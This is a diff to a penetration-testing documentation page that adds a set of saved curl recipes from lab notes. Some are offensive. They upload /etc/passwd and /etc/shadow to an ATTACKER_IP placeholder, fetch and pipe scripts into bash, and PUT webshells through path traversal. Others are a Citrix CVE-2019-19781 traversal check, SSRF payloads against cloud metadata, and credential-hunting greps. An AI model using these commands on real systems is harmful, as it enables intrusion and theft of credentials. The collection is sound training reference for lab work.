@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=curl) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -25,8 +27,681 @@ The upload command requires an uploadserver endpoint, not Python http.server.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=curl)
+## Notebook recipes
 
-## Learning and original examples
+43 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="Kali — read published federation metadata">
+
+### Kali — read published federation metadata
+
+**AD FS and SAML triage**
+
+```bash
+curl --fail --output federation.xml 'https://FEDERATION_HOST/FederationMetadata/2007-06/FederationMetadata.xml'
+```
+
+</Accordion>
+
+<Accordion title="Read an identity endpoint in the lab">
+
+### Read an identity endpoint in the lab
+
+**API credential triage**
+
+```bash
+read -rs LAB_TOKEN
+curl --fail-with-body -H "Authorization: Bearer $LAB_TOKEN" 'https://LAB_API_HOST/api/me'
+unset LAB_TOKEN
+```
+
+</Accordion>
+
+<Accordion title="5. Credential hunting (Linux)">
+
+### 5. Credential hunting (Linux)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+sudo -l                                               # #1 — instant win if misconfigured
+cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
+history | grep -iE "ssh|mysql|psql|password|sshpass|curl|wget"
+ls -la ~/.ssh /home/*/.ssh 2>/dev/null                # keys to pivot with
+grep -riI "pass\|secret\|cred" /etc /opt /var/www /home 2>/dev/null | grep -v Binary
+# Kerberos artifacts (domain-joined Linux) -> Pass-the-Ticket:
+find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
+ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
+```
+
+</Accordion>
+
+<Accordion title="CE (BloodHound Community Edition, Docker) — current/recommended">
+
+### CE (BloodHound Community Edition, Docker) — current/recommended
+
+**BloodHound: Full Reference**
+
+```bash
+sudo apt install -y docker.io docker-compose          # 'docker-compose' is the v2 standalone on Kali
+sudo systemctl start docker
+curl -L https://ghst.ly/getbhce -o ~/bh.compose.yml   # note: saves as bh.compose.yml (dot)
+sudo docker-compose -f ~/bh.compose.yml up -d
+sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
+```
+
+</Accordion>
+
+<Accordion title="Detect it (manual)">
+
+### Detect it (manual)
+
+**Citrix NetScaler: CVE-2019-19781 Reference**
+
+```bash
+curl -sk "https://<TARGET>/vpn/../vpns/cfg/smb.conf"
+```
+
+</Accordion>
+
+<Accordion title="How to spot it on a scan">
+
+### How to spot it on a scan
+
+**Citrix NetScaler: CVE-2019-19781 Reference**
+
+```bash
+# Fingerprint the web service
+curl -sik https://<TARGET>/ | grep -iE 'citrix|netscaler|nsc_'
+whatweb https://<TARGET>/
+
+# nmap service + the CVE detection script (see below)
+sudo nmap -p443 -sV --script ssl-cert <TARGET>
+```
+
+</Accordion>
+
+<Accordion title="The Concept of the Attack">
+
+### The Concept of the Attack
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+```
+
+</Accordion>
+
+<Accordion title="Mistake #1 — Assuming a Successful PUT Upload Equals Code Execution">
+
+### Mistake #1 — Assuming a Successful PUT Upload Equals Code Execution
+
+**Common Services: Personal Assessment Notes**
+
+```text
+curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://$target/shell.php
+```
+
+</Accordion>
+
+<Accordion title="Mistake #2 — Local curl Error Misread as a Server-Side Problem">
+
+### Mistake #2 — Local curl Error Misread as a Server-Side Problem
+
+**Common Services: Personal Assessment Notes**
+
+```text
+curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://10.129.78.187/shell.php
+curl: Failed to open shell.php
+curl: option --data-binary: error encountered when reading a file
+```
+
+**Common Services: Personal Assessment Notes**
+
+```text
+curl -k -H "Host: http://10.129.78.187" --basic -u fiona:987654321 https://10.129.78.187/docs.txt
+```
+
+</Accordion>
+
+<Accordion title="Mistake #3 — Repeating Mistake #1 With a Second Webshell">
+
+### Mistake #3 — Repeating Mistake #1 With a Second Webshell
+
+**Common Services: Personal Assessment Notes**
+
+```text
+curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data-binary @/home/WhiteWinterWolf/wwwolf-php-webshell/webshell.php --path-as-is https://10.129.78.187/webshell.php
+```
+
+</Accordion>
+
+<Accordion title="Phase 1 — Confirming Arbitrary File Write via CoreFTP&#x27;s HTTP(S) Service">
+
+### Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service
+
+**Common Services: Personal Assessment Notes**
+
+```text
+curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary "PoC." --path-as-is https://$target/docs.txt
+```
+
+**Common Services: Personal Assessment Notes**
+
+```text
+curl -k -H "Host: $target" --basic -u fiona:987654321 https://$target/docs.txt
+```
+
+</Accordion>
+
+<Accordion title="Banner Grabbing with curl">
+
+### Banner Grabbing with curl
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# Fetch only headers
+curl -I <target>
+
+# Follow redirects and check each hop
+curl -I http://inlanefreight.com
+curl -I https://inlanefreight.com
+curl -I https://www.inlanefreight.com
+```
+
+</Accordion>
+
+<Accordion title="Querying crt.sh">
+
+### Querying crt.sh
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# All certs for a domain
+curl -s "https://crt.sh/?q=<domain>&output=json" | jq .
+
+# Filter for entries containing "dev"
+curl -s "https://crt.sh/?q=<domain>&output=json" \
+  | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' \
+  | sort -u
+```
+
+</Accordion>
+
+<Accordion title="openid-configuration — What It Leaks">
+
+### openid-configuration — What It Leaks
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+curl -s https://<target>/.well-known/openid-configuration | jq .
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="Setup Steps">
+
+### Setup Steps
+
+**File Transfers for Linux and Windows**
+
+```bash
+curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt
+```
+
+</Accordion>
+
+<Accordion title="Web Upload (Python uploadserver with HTTPS)">
+
+### Web Upload (Python uploadserver with HTTPS)
+
+**File Transfers for Linux and Windows**
+
+```bash
+curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+</Accordion>
+
+<Accordion title="wget and cURL">
+
+### wget and cURL
+
+**File Transfers for Linux and Windows**
+
+```bash
+wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
+curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
+wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
+```
+
+</Accordion>
+
+<Accordion title="Bypassing filters">
+
+### Bypassing filters
+
+**File Upload Testing: Quick Reference**
+
+```bash
+# find where it landed, then trigger
+curl "http://$IP/uploads/shell.php?c=id"
+```
+
+</Accordion>
+
+<Accordion title="IMAP (Port 143 / 993 SSL)">
+
+### IMAP (Port 143 / 993 SSL)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Connect plaintext
+telnet <IP> 143
+
+# Connect SSL
+openssl s_client -connect <IP>:993
+
+# Commands (A1, A2 are tags — use any prefix)
+A1 LOGIN <username> <password>
+A2 LIST "" "*"                    # list all mailboxes
+A3 SELECT INBOX                   # open inbox
+A4 SEARCH ALL                     # list message IDs
+A5 FETCH 1 BODY[]                 # read full message
+A6 FETCH 1:* (FLAGS SUBJECT)     # list subjects
+A7 LOGOUT
+
+# Quick test with curl
+curl -k imaps://<IP> -u '<user>:<pass>'
+curl -k imaps://<IP>/INBOX -u '<user>:<pass>'
+```
+
+</Accordion>
+
+<Accordion title="POP3 (Port 110 / 995 SSL)">
+
+### POP3 (Port 110 / 995 SSL)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Connect plaintext
+telnet <IP> 110
+
+# Connect SSL
+openssl s_client -connect <IP>:995
+
+# Commands
+USER <username>
+PASS <password>
+STAT                # number of messages
+LIST                # list messages with sizes
+RETR 1              # read message 1
+TOP 1 0             # headers only
+QUIT
+
+# Quick test with curl
+curl -k pop3s://<IP> -u '<user>:<pass>'
+```
+
+</Accordion>
+
+<Accordion title="Phase 0 — External / Infrastructure Recon">
+
+### Phase 0 — External / Infrastructure Recon
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Certificate Transparency — pull subdomains from issued SSL certs
+curl -s "https://crt.sh/?q=<target-domain>&output=json" | jq .
+
+# Resolve a subdomain list to the hosts actually reachable on the internet
+for i in $(cat subdomainlist); do host $i | grep "has address" | grep <target-domain> | cut -d" " -f1,4; done
+
+# Build an IP list, then enrich each with Shodan (exposed services/metadata)
+for i in $(cat subdomainlist); do host $i | grep "has address" | grep <target-domain> | cut -d" " -f4 >> ip-addresses.txt; done
+for i in $(cat ip-addresses.txt); do shodan host $i; done
+```
+
+</Accordion>
+
+<Accordion title="Exploitation steps">
+
+### Exploitation steps
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+</Accordion>
+
+<Accordion title="Web enumeration">
+
+### Web enumeration
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+curl http://10.129.96.84/
+# <!-- /nibbleblog/ directory. Nothing interesting here! -->
+```
+
+</Accordion>
+
+<Accordion title="6. Networking / pentest quick commands">
+
+### 6. Networking / pentest quick commands
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+ip a                # show interfaces & IPs (replaces ifconfig)
+ip a show tun0      # just the VPN interface (HTB/CPTS uses tun0)
+ip route            # routing table
+ss -tulpn           # listening ports (replaces netstat)
+ping -c 4 10.10.10.10
+curl -s http://target/ | less       # fetch a page
+curl -I http://target/               # headers only
+wget http://target/file              # download a file
+nc -lvnp 4444       # netcat listener (catch reverse shells)
+python3 -m http.server 80            # quick web server to transfer files
+```
+
+</Accordion>
+
+<Accordion title="Tools">
+
+### Tools
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
+curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
+./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
+./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
+./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+./lse.sh -l1 # shows interesting information that should help you to privesc
+./lse.sh -l2 # dump all the information it gathers about the system
+```
+
+</Accordion>
+
+<Accordion title="Post-exploitation → RCE (ODAT)">
+
+### Post-exploitation → RCE (ODAT)
+
+**Oracle Database and TNS Enumeration**
+
+```bash
+echo "test" > testing.txt
+python3 odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba \
+  --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt   # Windows web root
+# Linux web root: /var/www/html
+curl http://<IP>/testing.txt                                  # verify
+```
+
+</Accordion>
+
+<Accordion title="Step 0 — confirm the relay target exists">
+
+### Step 0 — confirm the relay target exists
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+echo "10.129.234.172  CA01.inlanefreight.local"            | sudo tee -a /etc/hosts
+echo "10.129.234.174  DC01.inlanefreight.local dc01 inlanefreight.local" | sudo tee -a /etc/hosts
+
+certipy find -u wwhite@inlanefreight.local -p 'package5shores_topher1' -dc-ip 10.129.234.174 -stdout
+curl -s --max-time 8 -o /dev/null -w "HTTP %{http_code}\n" http://10.129.234.172/certsrv/   # 401 = web enrollment live
+```
+
+</Accordion>
+
+<Accordion title="Downloading TO a Linux target">
+
+### Downloading TO a Linux target
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+wget http://<reachable>:8080/tool -O /tmp/tool && chmod +x /tmp/tool
+curl http://<reachable>:8080/tool -o /tmp/tool
+# recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
+scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
+```
+
+</Accordion>
+
+<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">
+
+### Mental Model — "What Do I Use When?"
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+"I found an open port"
+├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
+├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
+├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
+├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
+├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
+├── Is it monitoring?      → SNMP (161), IPMI (623)
+└── Not sure?              → nmap -sV -sC <IP> -p <port>
+
+"I need to get files off the target"
+├── Linux → scp/sftp (22)
+├── Windows → SMB (445) or evil-winrm download
+├── Web → wget/curl
+└── Simple → python3 -m http.server (on target)
+
+"I need to get files onto the target"
+├── Linux → scp/sftp (22) or wget from attacker
+├── Windows → SMB, certutil, PowerShell wget
+├── Web upload → if upload form exists
+└── Simple → python3 -m http.server (on attacker)
+
+"I need a shell"
+├── Linux → SSH (22)
+├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
+└── Either → reverse shell via exploit
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision">
+
+### Quick Decision
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+Windows target → SMB (445)
+Linux target   → SCP/SFTP (22) or NFS (2049)
+No auth needed → FTP anonymous or TFTP
+Web server     → wget / curl
+```
+
+</Accordion>
+
+<Accordion title="Server-Side Request Forgery: Quick Reference">
+
+### Server-Side Request Forgery: Quick Reference
+
+**Server-Side Request Forgery: Quick Reference**
+
+```bash
+# point a URL parameter at internal targets
+http://$IP/fetch?url=http://127.0.0.1:80/
+http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/   # AWS metadata
+# internal port scan via response differences / timing
+for p in 22 80 3306 6379 8080; do curl -s "http://$IP/fetch?url=http://127.0.0.1:$p"; done
+```
+
+</Accordion>
+
+<Accordion title="Docker Install (Greenbone Community Edition)">
+
+### Docker Install (Greenbone Community Edition)
+
+**Vulnerability Assessment, Nessus, and OpenVAS**
+
+```bash
+mkdir -p ~/greenbone && cd ~/greenbone
+curl -f -O -L https://greenbone.github.io/docs/latest/_static/compose.yaml
+sudo docker compose up -d
+# Access at https://localhost:9392 — admin/admin
+```
+
+</Accordion>
+
+<Accordion title="Web Enumeration: Quick Commands">
+
+### Web Enumeration: Quick Commands
+
+**Web Enumeration: Quick Commands**
+
+```bash
+# Fingerprint
+whatweb http://$IP
+curl -sI http://$IP            # headers, server, redirects
+# Directory / file discovery
+feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
+gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
+# Virtual host (subdomain) discovery — match on response size to filter noise
+ffuf -H "Host: FUZZ.$DOMAIN" -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
+```
+
+</Accordion>
+
+<Accordion title="7. TROUBLESHOOTING">
+
+### 7. TROUBLESHOOTING
+
+**BloodHound: Full Reference**
+
+Context from the notebook: compose file "not found" filename typo ( bh.compose.yml  vs  bh-compose.yml ) match the exact name  curl -o  saved
+
+```text
+curl -o
+```
+
+</Accordion>
+
+<Accordion title="Quick reference">
+
+### Quick reference
+
+**Citrix NetScaler: CVE-2019-19781 Reference**
+
+Context from the notebook: Manual check curl -sk `https://<T>/vpn/../vpns/cfg/smb.conf`  → leaks  [global]
+
+```text
+curl -sk https://<T>/vpn/../vpns/cfg/smb.conf
+```
+
+</Accordion>
+
+<Accordion title="The essential toolset">
+
+### The essential toolset
+
+**Getting Started with Penetration Testing**
+
+Context from the notebook: Web tech fingerprint whatweb ,  nikto ,  curl -I
+
+```text
+curl -I
+```
+
+</Accordion>
+
+<Accordion title="Signature moves &amp; deep dive">
+
+### Signature moves & deep dive
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: Read mail over TLS:   openssl s_client -connect &lt;IP>:993  (IMAP) or  :995  (POP3); or  curl -k 'imaps://&lt;IP>' --user &lt;user>:&lt;pass>
+
+```text
+curl -k 'imaps://<IP>' --user <user>:<pass>
+```
+
+</Accordion>
+
+<Accordion title="Web Protocols &amp; Recon">
+
+### Web Protocols & Recon
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: curl Grab headers, banner grab curl -I &lt;URL>
+
+```text
+curl -I <URL>
+```
+
+</Accordion>
+
+</AccordionGroup>
